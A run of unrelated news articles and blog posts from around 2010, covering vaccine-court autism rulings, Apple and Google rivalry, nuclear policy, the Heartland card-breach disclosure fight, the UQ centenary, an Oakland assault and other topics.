“ We would see these devices , this robot , which the Iraqis nicknamed Hamodi . ”
In a city of seven million people but very few working movie theaters , the men said it was the first public showing of the movie , the recent Oscar winner that depicts a unit of American soldiers racing through Baghdad and disposing of car bombs — with their own hands and robotically — and improvised explosive devices , or I.E.D.’s .
Washington ( CNN ) --
A federal court ruled Friday that the evidence supporting an alleged causal link between autism and a mercury - containing preservative in vaccines is unpersuasive , and that the families of children diagnosed with autism are not entitled to compensation .
Special masters of the U.S. Court of Federal Claims released more than 600 pages of findings after reviewing three test cases and finding all the claims wanting .
" Petitioners ' theory of vaccine - related causation is scientifically unsupportable , " wrote Special Master Patricia Campbell - Smith in her conclusion about William P. Mead , whose parents , George and Victoria Mead , had brought one of the suits .
" In the absence of a sound medical theory causally connecting William 's received vaccines to his autistic condition , the undersigned cannot find the proposed sequence of cause and effect to be logical or temporally appropriate .
Having failed to satisfy their burden of proof under the articulated legal standard , petitioners cannot prevail on their claim of vaccine - related causation . "
In the second test case , Special Master George L. Hastings Jr. wrote , " The record of this case demonstrates plainly that Jordan King and his family have been though a tragic ordeal , " referring to the minor , whose parents , Fred and Mylinda King , had brought suit .
" After studying the extensive evidence in this case for many months , I am convinced that the opinions provided by the petitioners ' experts in this case , advising the King family that there is a causal connection between thimerosal - containing vaccines and Jordan 's autism , have been quite wrong . "
The special master italicized the last two words .
" Nevertheless , I can understand why Jordan 's parents found such opinions to be believable under the circumstances . "
" In this case , the evidence advanced by the petitioners has fallen far short of demonstrating such a link , " he said .
In the final test case , Special Master Denise K. Vowell wrote of Colin R. Dwyer , a minor , that his parents , Timothy and Maria Dwyer , " have not demonstrated by a preponderance of the evidence that Colin 's condition was either caused or significantly aggravated by his vaccinations .
Thus , they have failed to establish entitlement to compensation and the petition for compensation is therefore denied . "
Congress set up the special judicial forum , sometimes called the " vaccine court , " in 1986 to address claims over vaccine safety .
Rebecca Estepp , who attended the hearings and said her 12 - year - old son , Eric , has been diagnosed with autism she blames on vaccine , described herself as " devastated " with the rulings , but not surprised .
" The deck is stacked against families in vaccine court , " she said in a telephone interview from her home in Poway , California , about 20 miles north of San Diego .
" You have government attorneys defending a government program using government - funded science before government judges .
Where 's the justice in that ? "
Tom Powers , a Portland , Oregon - based lawyer for the families involved , said his clients were disappointed .
" All three families are committed to following the appeals process , and pursuing that avenue to get justice and compensation for their kids , " he said .
The special masters ' decisions are subject to review by judges in the U.S. Court of Federal Claims .
Within the next 30 days , attorneys for the families will ask the claims court judges to review the decisions and rule that the children are , in fact , entitled to compensation .
After government lawyers have a chance to respond to the motions for review , the judges will schedule oral argument and hearings , probably in the summer , Powers said .
Though Friday 's decisions do not end the legal battle , Dr. Paul Offit , chief of infectious diseases and the director of the Vaccine Education Center at the Children 's Hospital of Philadelphia , was optimistic .
" Parents should take heart in this decision and continue to immunize their children with the confidence that they are the safest , most effective way to protect against dangerous diseases , " the pediatrician said .
" It 's time to move forward and look for the real causes of autism , " said Alison Singer , president of the Autism Science Foundation .
" Our children deserve real answers and at this point doing more and more studies of vaccines , when the science is so clear , would be allowing politics to triumph over science . "
The three test cases represented thousands of children who have autism and whose parents contend their disorder was triggered by an early childhood vaccination .
The vaccines contained thimerosal , a mercury - derived compound the parents say helped bring on regressive autism , in which normally developing children suddenly exhibit learning disorders and behavioral problems , typically between ages 1 and 2 .
The theory that vaccines or thimerosal can cause autism is rejected by most medical experts , including the Institute of Medicine , the U.S. Centers for Disease Control and Prevention and the American Academy of Pediatrics .
Multiple scientific studies also have failed to prove a link .
Thimerosal was removed from infant vaccines in 1999 .
In February 2009 , the court 's special masters concluded that the evidence supporting a link between measles - mumps - rubella vaccine , or MMR , combined with thimerosal - containing vaccines , was also unpersuasive .
This week , the U.S. Supreme Court agreed to hear the appeal of parents who say that a range of vaccines administered to their child caused serious health problems .
The justices on Monday agreed to decide whether drug makers can be sued outside the vaccine court .
The lawsuit was brought by the parents of Hannah Bruesewitz , a girl from the Philadelphia , Pennsylvania , area .
The parents said she was healthy as an infant in 1992 when given a series of DPT shots -- a combination of vaccines to prevent diphtheria , pertussis ( whooping cough ) , and tetanus .
After the third series , according to court briefs , the child began having seizures and became disabled .
Now a teenager , Hannah continues to suffer what is described as " residual seizure disorder . "
The Bruesewitzes alleged Wyeth Laboratories failed to adequately warn them and other parents of the risks associated with the vaccine .
The vaccine court rejected the initial claim , so the family tried to revive the lawsuit in other federal courts .
A federal appeals court eventually ruled for Wyeth , now owned by Pfizer Inc. , concluding all design - defect claims were barred under statute .
Despite that victory , the company urged the high court to hear the case , saying it seeks final resolution on the broader legal questions .
The Obama administration also urged review and is supporting the company and the federal law in question .
Wyeth and other drug manufacturers say their products are generally safe , but side effects can occur in rare cases .

Once the best of friends , Google and Apple have been warring for months now .
First there was Apple 's rejection of Google Voice from the App Store , which was soon followed by Google CEO Eric Schmidt stepping down from Apple 's board of directors .
And then let 's not forget about Google positioning its Android OS to challenge the iPhone , Steve Jobs calling Google 's " Do n't be Evil " mantra bs , and of course , Apple indirectly going after Android by suing HTC for patent infringement .
All in all , while Apple and Google still work closely on some initiatives , a new wrinkle in their relationship appears to manifest itself every couple of weeks .
And now we have yet another example on our hands .
The word " Google " is so ingrained as part of our everyday lexicon that it's now referenced as a verb more so than anything else - i.e " Did you Google it ? "
In fact , Google is so synonymous with ' Search ' that in the current version of mobile Safari , where Google is the default search engine , users press a " Google " button after they 've typed in their web query .
But those days appear long gone .
In the new iPhone OS 4 , the " Google " button has been replaced by a more generic " Search " button .
Does this mean that Apple is indeed considering a deal with Microsoft whereby Bing would become the default search engine on the iPhone ?
Or maybe it 's simply an indication that Apple does n't want to give Google free branding promotion on the iPhone , even if it happens to be the default search engine .
I , for one , hope Apple 's hyper - competiveness regarding the iPhone and Android does n't cloud their judgement to the extent that Bing becomes the default search engine on the iPhone .
While Microsoft has certainly made some strides with their search engine offering , it simply can't compete with Google .
At least not yet , anyways .
The iPhone is all about quality , and it seems a bit backwards to push Google search aside when it 's clearly the highest quality search engine available .
While Google search would still be available as an option in a Bing / iPhone world , why make users wade into the system preferences to begin with ?

Air hostess uniforms given to employees of Japan Airlines ( JAL ) have become massively popular on the black market .
Shops specialising in replica uniforms of all kinds are common , but the airline stewardess uniforms are the real thing .
After filing for bankruptcy protection in January , the company is asking for volunteers to take redundancy .
While that has raised hopes of a flood of uniforms becoming available , JAL is keen to ensure all its clothing and equipment comes back .
Roland Buerk reports from Tokyo .
President Obama introduced a new nuclear weapons policy Tuesday with the aim of reducing nuclear weapons and a promise that America would no longer build them .
“ To stop the spread of nuclear weapons , prevent nuclear terrorism , and pursue the day when these weapons do not exist , we will work aggressively to advance every element of our comprehensive agenda – to reduce arsenals , to secure vulnerable nuclear materials , and to strengthen international agreement , ” Obama said in a statement .
In a Los Angeles Times opinion piece Vice - President Joe Biden wrote that the Nuclear Posture Review implements Obama ’s agenda , first outlined in Prague a year ago to prevent the spread of nuclear weapons and pursue the peace and security of a world without them .
The new strategy is a sharp departure from pervious ones released in 2001 and 1994 and “ leaves Cold War thinking behind , ” wrote Biden .
He continued , “ The president and I made a promise to the American people to protect them from nuclear risks .
We have no higher obligation .
Our strategy delivers on that promise and tackles the most immediate threats our planet faces . ”
Some of the policies include setting limits on the use of U.S. warheads , declaring some countries off limits even in wartime and steps toward reducing U.S. reliance on its most destructive weapons .
Under the new plan the U.S. promises not to use nuclear weapons against countries that do n’t have them .
The plan stopped short of saying the U.S. will never be the first to launch a nuclear attack , a position many arms control advocates wanted .
Peace and non-proliferation groups hope the U.S. will adopt policies that declare the “ sole purpose ” of nuclear weapons is to deter others from using them .
But the Obama administration fell short on such a stance to preserve the option of using nuclear weapons to counter a non-nuclear threat .
The Center for Arms Control and Non-Proliferation in a statement said the review could have been bolder in some areas but overall it ’s a significant improvement from the past .
“ The encouraging steps outlined in the report should not be viewed as the end of the journey toward reducing the dangers posed by nuclear weapons , but they point us in the right direction , ” said the Center .
Kevin Martin , executive director of Peace Action in a statement said , “ President Obama is the most engaged U.S. president ever on nuclear disarmament issues . ”
Martin added that Peace Action applauds Obama ’s efforts and remains encouraged by the New START treaty , to be signed in Prague Thursday , as a modest but necessary step toward further nuclear arms cuts with Russia .
However Martin criticized Obama ’s Nuclear Posture Review saying it “ appears to be too beholden to outdated Cold War thinking , and it does n’t measure up to his vision of a nuclear - free world . ”
Martin noted , “ It ’s certainly better that the one released by the Bush administration , which called for the possibility of using nuclear weapons on non-nuclear states . ”
That policy has been reversed , but the measure leaves room for the possibilities of new warheads in the future , saids Martin .
And the administration has also proposed a big increase in funding for the U.S. nuclear weapons complex .
Both policies are disappointing , says Martin .
But the report is not the last word on these or other nuclear weapons subjects , Martin noted .
“ Congress , the American people , and the international community all have a role to play in advocating faster progress toward the global elimination of the scourge of nuclear weapons .
The upcoming Non-Proliferation Treaty Review conference in May will attract tens of thousands of people from around the world to New York City demanding a safer world with no nuclear weapons , ” he said .

Just when I ’d “ discovered the magic ” of Celtic Thunder and become certain that nothing could more effortlessly succeed at making my ears bleed , a friend sent me a link to North Carolina ’s Winter Band - the most disturbing Christian rock band since , well , since ever .
If you ’re a geriatric , hobo - wizard , Jesus freak with a dirty mop - head hanging from your chin , it ’s probably not the best idea to be too critical of others .
But that does n’t stop WinterBand ’s namesake , Steve Winter , from attacking Catholics , Muslims , democrats , women and countless others for the intolerable sin of being outside his confusing comfort zone .
It ’s hard to fathom that WinterBand band is n’t a joke , something imagined by a deeply disturbed idiot savant in the throes of a swine flu fever dream .
But this classic rock - loving crew of bearded bible thumpers is the real deal .
They ’ve got their own YouTube channel with dozens of hysterically - retro videos .
Winter even has his own preaching series where he outlines dozens of reasons why you ’ll be spending eternity in a “ lake of fire . ”
But let ’s talk about their music .
As it says on their website , WinterBand are a “ father and son Christian rock / blues / metal band . ”
Steve plays guitar and his clean - shaven son rocks the drums .
Their sound ranges from Led Zeppelin to ZZ Top to The Spin Doctors , and if you close your eyes and pretend you ’re not listening to a crew of inflammatory religious fanatics who dress like homeless warlocks , they ’re actually pretty hilarious in a campy sort of way .
Senator Zell Miller is apparently a fan .
Best of all they ’re prolific .
For the uninitiated , I ’ve assembled a collection of their essential work .
1. “ Hippie on Grandma ’s Wall ”
https://medium.com/media/c152a65a011e321c4dad7eb1895002e4/href
This was the band ’s latest 2010 single - until they dropped “ Bound and Determined to Burn ” just yesterday !- and clearly it ’s destined to become a huge hit .
If you ’re confused by the message , let me explain .
Winter thinks depictions of Jesus with long hair are sacrilegious .
“ If a man has long hair , it is a shame unto him , ” says Winter .
Though clearly he ’s an advocate for beards , Winter says it ’s okay for dudes to shave as long as they ’re not doing so “ for effeminate reasons . ”
Keeping your hair short is a recurring theme in their lyrics , though it should be noted that “ real Christian women do n’t cut their hair . ”
2. “ Obama Muslim 911 ”
https://medium.com/media/e9526d3d03ae806b42101c928cefb496/href
This SEO - inflected doozy was produced on the eve of the 2008 presidential election “ as an act of patriotism and reverence for 911 . ”
If you like the political stuff , do n’t miss the McCain Boogie , which features some fine guitar work by Winter .
3. “ Where Babies Come From ”
https://medium.com/media/babbc4edd1bfb76241c200449b4365c0/href
Prog rock meets pro-life lunacy … somehow the two just seem to go together .
4. “ Narrow Way ”
https://medium.com/media/3333b74d91adf82074ad731a08818a83/href
This is just one of dozens of songs about how Christians who believe in the trinity are “ lukewarm , infidel reprobate trash ” which in secular terms translates to “ dicks . ”
5. “ Whirlwind ”
https://medium.com/media/9ee66e0e0151ecc56d0691972fd8d63f/href
Perhaps their heaviest rocker .
If Winter had some bat blood in that tangled mop on his face , it would almost feel like they ’re channeling Black Sabbath .
6. “ The Devil ”
https://medium.com/media/380357e5977e32cb3546e65de0340090/href
Some serious shredding by Winter on this one .
7. “ Jesus Died and Went to Hell ”
https://medium.com/media/770bb9fe63b1ee9636354be27e28419f/href
Another rocker and winner of WinterBand ’s most badass title .
I ’d love to hear Mastodon do a cover .
8. “ Shame Shame Shame ”
https://medium.com/media/b0a3b49d68f179a5abd5e8fa9d72841e/href
In Winter ’s own words : “ It is a sin for women to speak out and address the congregation during a worship service and rebellion is as the sin of witchcraft . ”
On the other hand , Jesus loves hearing second - rate Moody Blues jams performed by men dressed like J. R. R. Tolkien characters .
9 . “ Grace 2008 ”
https://medium.com/media/c2906bdce6eebb96e46de1488ecbd0c9/href
This little anti-Muslim ditty is the subject of a confusing anticensorship tirade on the band ’s website that I ’m tempted to make fun of , but will avoid doing so out of fear that Winter will try to locate me and kill me .
Musicians , take note !
“ Winter Band is looking for a new bass player to allow Bobo to fulfill his long term ambition to pursue a career as a greeter for a well known discount chain .
We will miss him but must agree that it is for the best .
It would be nice if the new bass player was better than him . ”
Clean - shaven effeminate pussies need not apply .

Those of you who do n’t watch Fox ’s latest sci- fi venture , Fringe , missed a miraculous moment last night : the birth of a new genre .
The much - discussed episode , titled “ Brown Betty ” after a very special breed of pot , is a drug - induced , musical fairy tale told by a mad scientist to the main character ’s young niece .
It ’s a noir tale of a broken - hearted private detective , a young man with a glass heart , and an evil scientist who steals children ’s dreams as inspiration for his inventions , which include teddy bears , hugs , and singing corpses .
But I ’m not too interested in the plot , as fun and quirky as it was ; nope , I ’m interested in the setting .
The fairy tale combines a prohibition - era , jazz age setting with the sci - fi technology of the Fringe universe … Jazz Punk !
Steampunk is , for the most part , running out of steam ( haha ) , but it ’s been a major sci - fi fetish for a good twenty years now .
Could this be its replacement ?
You still have the dark , smokey atmosphere of Victorian London , but this time it ’s noir New York , gangster Chicago .
Imagine the potential : think of flapper dresses , the fedoras , the high - tech computers !
Picture the roaring twenties , but with lasers and flying cars !
Swing dance , but with AI ?
Yeah , okay , that last one was cheesy , but I think the Fringe writers , in keeping with Fox ’s theme week , inadvertently created an entirely new sci - fi genre — and possibly a new fetish .
If you have n’t watched the episode , check it out .
Let your imagination run wild with the possibilities …
Smoke some Brown Betty if you have to .

This week 's story about JC Penney trying to keep its name out of the Heartland credit - card debacle did n't get anywhere near the attention heaped upon hacker mastermind Albert Gonzalez netting himself a 20 - year prison sentence in the case , so it 's definitely worth a mention here .
( 2010's 25 Geekiest 25th Anniversaries )
According to an IDG News Service report , JC Penney attorneys argued in December of last year that , absent evidence of resultant identity theft , disclosing the retail chain 's role as a victim in the Heartland case - two years after the actual breach -- " may discourage other victims of cybercrimes to report the criminal activity or cooperate with enforcement officials for fear of the retribution and reputational damage that may arise from a policy of disclosure as espoused by the government in this case . "
U.S. prosecutors stated the obvious in response : " Most people want to know when their credit or debit card numbers have been put at risk , not simply if , and after , they have clearly been stolen . "
The scales of justice eventually tipped in favor of disclosure , but only after a Massachusetts judge undid the bamboozlement that had allowed a New Jersey counterpart to buy into JC Penney 's sorry song and dance .
And should anyone doubt today the wisdom of that corrective decision , they should have a chat with one of 5,000 customers of Colorado 's First National Bank of Durango , who had no idea that they were potential Heartland victims until being notified only March 1 of this year .
Actually , as many as 20 of them may have suspected earlier when they started noticing apparently fraudulent charges to their accounts .
I learned of the Colorado bank victims through an item in a newsletter published by DataLossDB and asked one of that organization 's project managers , Kelly Todd , whether it was indicative of there being yet more Heartland time bombs ticking out there ; little stashes of card numbers just waiting to be used by your more patient criminals .
Todd 's reply : " Yep , that 's how I read it , too .
At least one list subscriber mailed me off - list to ask why people do n't realize that once card numbers or other personal information has been compromised , said information is compromised forever ( or at least until the information changes , which wo n't happen for SSN , DOB , and 99.999 % of the time , a name ) .
A year later and still reporting Heartland - related news ?
Sure .
Card numbers will be out there at least until they get cancelled or expire , and my new cards usually have the same number as the old one , so if they 're in the hands of the bad guys , I 'm probably at risk without even knowing it . "
The bottom line here is that corporate interests will first and foremost always be focused on their corporate interests : their own bottom lines .
Of course they 'd rather not have their good names sullied by association with an identity - theft case of this magnitude .
Of course they 'll trot out the lawyers to downplay the exposure to their customers ... it 's all part of minimizing their own exposure .
As the U.S. prosecutor noted in opposing JC Penney 's responsibility dodge , most people want to know when their credit or debit card numbers have been put at risk .
You can be certain that " most people " here includes the JC Penney lawyers who argued otherwise .
In 2010 , The University of Queensland celebrated its first 100 years .
Alumni , current and former staff , students , and friends and partners of the University in the community were invited to participate in the UQ Centenary celebrations .
It was a time of celebration ; a time to recognise 100 years of academic excellence , breakthrough research , and wonderful people who continue to shape the world .
Of the three dates relating to the founding of the University , the one we derive UQ ’s anniversary year from is 16 April 1910 .
Under the University of Queensland Act 1909 , the University was constituted from the date of publication of the membership of the Senate , and 16 April 1910 was when the first Senate members were named in the Queensland Government Gazette and the work of creating the University commenced .
View the UQ Centenary Flickr account for photos taken at and collected for the centenary celebrations .
How we celebrated
More than 80 events were held throughout the year , including the UQ Centenary Celebration Day , a UQ birthday celebration at each campus , alumni celebrations and reunions , an Oration Series , and exhibitions and events for staff and community .
People participated in the celebrations in a range of ways , from providing suggestions and historical information to volunteering at , running and attending events .
Centenary Celebration Day
On 18 April 2010 , an estimated 15,000 people converged on the St Lucia campus for the Centenary Celebration Day .
The free community event included live music in the Great Court ; a Writers '
Hub showcasing UQ writers , science and innovation talks ; information sessions on global change and positive ageing ; and campus tours .
The carnival atmosphere was enhanced by numerous roving entertainers or spontaneous performances across campus – including stilt walkers , the Queensland University Musical Society choir , Institute of Modern Languages Travellers ’
Tales ( street theatre performances in Spanish , French and Chinese ) , the Emmanuel College Pipe Band , The Belles of Duchesne bell ringers , flash mobs performed by dancers from Indooroopilly State High School – and by international food stalls and craft stalls .
The Dusk Spectacle , featuring an orchestra performing before the deep blue - lit front facade of the Forgan Smith building and backed by a light show , provided a fitting finale as the day ended .
UQ Oration Series
The Oration Series was a highlight of the year - long celebrations and drew distinguished and high - profile orators , as well as enthusiastic audience members from business , industry and government ; UQ staff and students , as well as the media and general community .
Oration topics covered past , present and future issues , and achievements that have impacted on and will continue to impact on local , national and global communities .

Art exhibitions and commemorative events
The UQ Art Museum staged nine art exhibitions at the James and Mary Emelia Mayne Centre on the St Lucia campus during the Centenary year .
Two special Centenary exhibitions drew thousands of visitors to the campus :

July 2010 ) Before Time Today : Reinventing Tradition in Aboriginal Art ( 11 September –28 November 2010 )
Mayne Medallion
In 2010 , the University commissioned a new artwork commemorating one of its first and most significant benefactors , Dr James O'Neil Mayne .
Dr Mayne and his younger sister , Mary Emelia Mayne , made the University 's move to its current St Lucia site possible , with donations amounting to £ 60,000 between 1927 and 1929 .
The artwork consists of a life - size bronze portrait medallion relief of Dr Mayne , accompanied by a bronze dedication plaque , set in a sandstone block .
The work was created by University Sculptor Dr
Rhyl Hinwood AM .
It has been placed in the entry vestibule of the Forgan Smith Building above the building ’s foundation stone .
Reginald Heber Roe Tree
On 22 June , 29 descendants of Reginald Heber Roe gathered at the St Lucia campus to plant a commemorative tree to honour Reginald Roe , member of the First Senate and the first person to hold the title of Vice - Chancellor of the University .
State Government Reception
On 25 October 2010 , the Premier of Queensland , Dr Anna Bligh , hosted an official reception at the State ’s Parliament House to celebrate the Centenary of the University .
The event honoured the important contribution of the University to the State of Queensland .
This contribution was also recognised in the 2010 Queensland Greats Awards made by the State Government and announced on 3 June during Queensland Week .
UQ was named as a Queensland Great in the institution category .
Senate Dinner and commissioned music
Exactly one year after the Centenary celebrations were launched , the 2010 Senate Dinner was held on 10 December in the Long Room at Customs House .
It was the last corporate event of the Centenary , and at the dinner , the 15 - minute piece of music commissioned by the University for the Centenary , The scattering of light , was performed for the first time by the School of Music ’s Ensemble - in - Residence .
Well - known Australian composer Dr Andrew Ford composed the work especially for the Ensemble - in - Residence .
The process of the creation of the work was embedded in the teaching of composition in the School of Music during 2010 .
The work will become a core part of the Ensemble ’s repertoire .
Funding
All units were encouraged to invest in Centenary activities to help raise their profile and build relationships , especially with alumni .
A sum of up to $ 5000 per unit was available for approved activities in the Centenary year .
The funding was not intended to cover all costs associated with an activity or event but was intended to support initiatives and activities that in turn supported the objectives of the Centenary and its key messages .
Applications were invited on 8 May 2009 , with a closing date of 5 June 2009 .
Fifty - three applications were processed , some involving multiple units .
Eventually , 42 events or activities involving 49 faculties , schools , centres and other academic and administrative service delivery units received funding .
Final 2009 UQ
Senate meeting
UQ ’s 31st Senate held its final meeting for 2009 on Thursday 10 December .
The date marked 100 years since the State Government gave the people of Queensland a university in celebration of its Golden Jubilee .
On 10 December 1909 , the University of Queensland Act came into being and Old Government House was dedicated to the use of the new university .
Guests included Queensland Premier Anna Bligh and the Queensland Governor , Her Excellency Penelope Wensley AO .
A message from the Vice - Chancellor
From a cancer vaccine and new generation jet engine technology , through to an Oscar - winning actor and umpteen fine works of literature , UQ ’s first century is characterised by remarkable contributions to the Queensland , national and international communities .
The Centenary is a starting point for a new century of high - impact outcomes from UQ learning , discovery and engagement .
It is symbolic , but the timing could not be better .
In Australia and internationally , there is growing recognition that education and research will be pivotal to future prosperity – economically , socially and environmentally .
Our students , at all levels , are as exemplary today as at any time during the past 100 years .
And the pace of discovery is accelerating in areas where UQ has the capacity to be globally influential – for example , early disease diagnosis , personalised medicine , and sustainable energy .
The promise of coming decades will be fulfilled by people who stand on the shoulders of the giants of 1910 – 2010 .
So , during the Centenary we will celebrate the staff , students and community partners who have brought UQ to its current position of strength .
To maximise the involvement of people who have played a part in UQ's success , I invite you to sign up here to be kept informed of Centenary activities in Australia and overseas .
I look forward to joining you in launching UQ into its second century .

Anglo American , the London - listed mining group , will this week face accusations that it risks damaging one of the world 's most valuable salmon habitats .
Alaskan tribal leaders and fishermen will come to London on Thursday to tell the company 's annual meeting that plans to build an open - pit gold and copper mine in the Bristol Bay region will destroy the breeding grounds of sockeye salmon .
They claim that mining the ore deposit , which is located underneath some of the most important salmon spawning grounds , will generate as much as 10bn tonnes of mine waste and require 160bn litres ( 35 bn gallons ) of water to be taken from rivers .
Bobby Andrew , a spokesman for Nunamta Aulukestai , a group representing eight local villages , said that he hopes to persuade shareholders to reconsider the project .
" We do not trust that they [ Anglo American ] will work in an environmentally safe way , " he said .
" I am not opposed to mining , but the mine is in a wrong location .
We , the people who live here , rely on the renewable resource of salmon . "
The mine 's opponents have already won the support of large businesses in the UK and overseas .
Six UK jewellers , including Goldsmiths and Beaverbrooks , have joined eight US retailers , led by Tiffany & Co , which have pledged not to source gold from the proposed mine .
However , Anglo American has said that it will pursue the development only if it can be operated responsibly .
James Wyatt - Tilby , a company spokesman , said : " At the moment this is just an exploration project and there is no mine plan at this stage .
We have been very clear that if we cannot build this mine in a safe and responsible way then we will not build it at all . "
The protest follows a string of revolts at annual meetings by environmentally aware investors .
Last week , BP faced a call from several large investors to review its oil sands activities .
A similar shareholder resolution will be voted on at Shell 's annual meeting , to be held on 18 May .

A 59 - year - old San Francisco man was on life support Saturday , a day after he was assaulted in broad daylight in downtown Oakland trying to defend his son's honor in what Mayor Ron Dellums called " a brutal and random attack . "
Tian Sheng
Yu was punched once in the mouth by an unknown assailant and fell to the ground , hitting his head , said his son , Jin Cheng Yu , 27 , who witnessed the blow .
" It happened so fast , " the younger Yu said Saturday afternoon in front of his home in San Francisco 's Portola district , where he stood still wearing pants splattered with blood , his left eye badly swollen from the unprovoked blow .
His father was listed in grave condition and was in intensive care at an Oakland hospital .
Jin Cheng
Yu , a recent graduate of UC Davis , said that he and his father went to the 1800 block of Telegraph Avenue in Oakland around 3 p.m. to check out coins in a jewelry shop when the attack occurred .
Tian Sheng
Yu let his son out of the car while he went to look for a parking place .
Jin Cheng
Yu started walking toward the shop when one of two young men or teenagers walking toward him slugged him in the eye " for no reason . "
Stunned , he caught up with his dad and told him what had just happened .
" My father wanted to know why I did n't fight back , " he said .
" He took me to go look for them . "
He said they found the suspected assailant and his companion around the corner .
" My father asked them in Chinese - his English is n't very good - ' Why do you beat my son ? '
They did n't say anything .
Then one of them punched my father in the mouth .
He fell backwards to the ground . "
The suspects then turned to the son .
Jin Cheng
Yu said they punched him " four or five times . "
He said he tried to hit back , but kept missing .
Jin Cheng
Yu had never been in a fight before .
Witnesses called 911 .
One of those callers was Jean Van Fleet .
She saw the attack through the front window of her bookstore , Bibliomania , across the street .
A passer - by yelled into the store for her to call police , and when Van Fleet looked outside she thought she saw three young men beating up someone else .
She was on the phone with the 911 dispatcher for only two or three minutes she said , and when she turned back to the street , the young men were gone and Yu was on the ground .
His face was bloody and his body was convulsing .
" I 'm so sad he was beaten so badly , " Van Fleet said Saturday , adding that she never saw the faces of the young men involved in the attack .
" I kind of wish I 'd gone over there with a broom and yelled at them all to leave . "
Tian Sheng
Yu never got up from the sidewalk .
He was rushed by ambulance to a nearby hospital .
His son said his chances for survival are slim .
" It 's all my fault , " he said after a sleepless night keeping vigil with his mother at the hospital .
" I should n't have ever told my father I was punched . "
A motive for the attack has not been determined , according to police .
Jin Cheng
Yu said he was not robbed .
Oakland police spokesman Jeff Thomason said the attack was unprovoked .
" There was no warning , no explanation , " Thomason said .
" The father did not walk up in a threatening manner .
He just wanted to know what happened .
Any father would want to do that . "
It was not the first time the family fell victim to crime .
In January , Tian Sheng Yu's wife was robbed on Third Street in San Francisco , her son said .
The family emigrated from Beijing in 1998 .
Tian Sheng
Yu started a painting and remodeling business .
His only child graduated from UC Davis with a degree in biochemistry and had plans to go back to school .
" Now I do n't know what I 'm going to do , " said Jin Cheng Yu , who lives with his parents in a modest house on a dead - end street with sweeping views of the East Bay .
" I have to get a job and support my family .
I can never forgive myself for what happened . "
Dellums issued a statement Friday , condemning the assault .
" The brutal and random attack this afternoon in broad daylight on two innocent men was senseless and outrageous , " Dellums said .
" Our hearts and prayers are with the father , now on life support , and his loved ones who are also suffering . "
The mayor said police have stepped up patrols in the uptown and downtown business districts , and " they will pursue every lead until those responsible for this violence are apprehended . "
Police released surveillance video and still images of the suspects and asked for the public 's help in identifying them .
Thomason described the first assailant as a black male teenager with a medium to dark complexion , short hair , 5 feet 7 inches tall , weighing 120 - 130 pounds and wearing a black " Raiders - like jacket . "
He described the second suspect as black male 17 to 20 years old with a medium to dark complexion , short hair , 5 feet 9 inches to 5 feet 10 inches tall , weighing 150 - 160 pounds and wearing a maroon shirt .
The assault occurred on an open stretch of sidewalk next to the Fox Theater , beneath a towering palm tree .
The 1800 block of Telegraph Avenue is in many ways an up - and - coming neighborhood , area business owners said , with new restaurants and bars opening amid some of the older pawn shops and cash checking storefronts .
Van Fleet said that in 15 years of running a used book business on the corner of Telegraph and 19th Street , she 's never felt unsafe .
Sometimes troubled people will walk into her store and yell or make a scene , but she 's always been able to handle them .
A few blocks down the street , Warren Taylor said he wold have moved a long time ago if the neighborhood were n't safe .
His psychology office is just a couple of blocks from where the attack took place .
" It 's a good neighborhood , " Taylor said .
" This was really an unfortunate incident .
But it could have happened anywhere . "
John Hopes , a city worker who cleans and sweeps the streets in the neighborhood six days a week , said he 's never seen any kind of violence in the area .
" Further downtown , sure , " he said .
" But around here it 's rare .
People come here and do their business and just pass through .
Actually , they 're really nice to me , always saying hi .
It 's really sad what happened . "
Oakland homicide investigators were called in to help with the probe because of the severity of the assault , according to Oakland police spokeswoman Holly Joshi .

Parks , arena facilities , baseball diamonds , running tracks and soccer fields are relatively close by .
Organized youth teams are full of boys and girls looking to have fun with their friends , enjoying the warmth of sunshine and blue skies .
At the same time unknowingly improving their communication skills , gaining new friends through participation and utilizing problem solving that will be invaluable later in life .
Now close your eyes and imagine if there were no local organized youth athletic leagues .
Picture the lack of available facilities suited to host organized sport as well as the absence of sufficient equipment .
Unforutnately , this is reality for communities in 23 countries affected by war , poverty and disease in Africa , Asia , the Middle East and South America .
Conversely , there is an international humanitarian organization on the forefront growing an ambitious network of volunteers , coaches , teachers and world - wide athlete ambassadors assembling sport and play programs to disadvantaged areas of the world .
Right To Play , founded in 2000 by four - time Olympic gold medalist Johann Olav Koss , uses sport and play programs to improve health , develop life skills , and foster peace for children and communities in some of the most underprivileged locales on the globe .
Sabres defenseman Steve Montador has been a Right To Play athlete ambassador since early 2007 , witnessing the organization ’s work firsthand .
“ Seeing the program work in person , by bringing sports and games to kids around the world is a gross over - simplification .
I think it was a great opportunity to have an unbiased opinion and see it in action , ” Montador said .
In the summer of 2007 , Montador received a text from friend and former Boston Bruins teammate Andrew Ference asking if he wanted to join him on his journey to Africa to work with Right To Play .
“ I met up with him in London and we continued on from there , ” recalled Montador .
Montador would end up in Tanzania , a nation the size of Wisconsin , on the east coast of Africa .
The population distribution is extremely uneven - more than 80 percent of the population is rural .
Health issues are abundant , the leading cause of death in children is malaria ; for adults the problem is HIV / AIDS .
One of the more memorable revelations Montador had in Tanzania was the fact that even though he could not speak the native language of Swahili , the common acceptance of non-verbal communication helped bridge any language barriers .
“ When I ’m on a soccer field , I do n’t have to speak Swahili to let them know that I ’m open .
We can communicate with observations and reads that are universal in sport , ” said Montador .
Right To Play programs are guided by The United Nations Convention on the Rights of the Child .
Two program specific principles are inclusion and sustainability .
Inclusion promotes the involvement of youth who may be left behind for reasons of gender , disability ethnicity or religion .
Almost 50 percent of children participating were girls , and more than 50 percent of coaches / teachers / leaders were female according to figures from 2008 .
Sustainability ensures programs have a lasting , fruitful impact that centers on building the capacity of communities , partner organizations and individuals to deliver learning objectives through sport and activites .
Montador shared the same sentiment : “ Each locale , we want to leave striving to be self - sustaining ; all of the local organizations work to keep all the traditions in place by incorporating local coaches which hopefully will foster the local spirit of the value of sport in those communities .
” Athlete ambassadors , volunteers and coaches use sport and play as tools for learning in four development areas :• Basic Education and Child Development• Health Promotion and Disease Prevention• Conflict Resolution and Peace Building• Community Development and participation
“ One hundred years ago , you would have seen drawings of countries and continents and said ‘ that does n’t affect me , it ’s on the other side of the world . ’
With the globalization of the world , you can get anywhere in a day .
Now that we have the resources to see further outside of our own backyard , in a way makes it our responsibility to help , ” said Montador .
In early 2009 , Right To Play reached more than 620,000 children in weekly regular sport and play activities .
These activities were facilitated by more than 14,000 local coaches / teachers .
The goal for 2010 , will be to reach one million children on a weekly basis .
